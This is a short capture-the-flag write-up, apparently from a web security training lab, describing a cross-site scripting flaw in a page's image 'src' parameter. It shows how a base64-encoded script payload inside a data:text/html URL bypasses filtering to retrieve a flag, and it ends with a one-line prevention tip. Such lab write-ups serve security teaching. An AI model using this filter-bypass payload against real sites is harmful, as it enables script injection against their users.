# 04_iamge_xss

## Instruction

At the following page

```
http://192.168.56.101/?page=media&src=nsa

```

We have dependencie between url and image on screen
If we'll try directly paste `<script>alert(1)</script>` nothing will work
Although we can convert this script to base64 format

```
echo -n '<script>alert("123")</script>' | base64

```

The output is `PHNjcmlwdD5hbGVydCgiMTIzIik8L3NjcmlwdD4=`

So we can access to the following url and get our flag

```
http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiMTIzIik8L3NjcmlwdD4=
```

## How to prevent

Can be prevented usign data encoding and input validation.

Cross Site Scripting Prevention Cheat Sheet
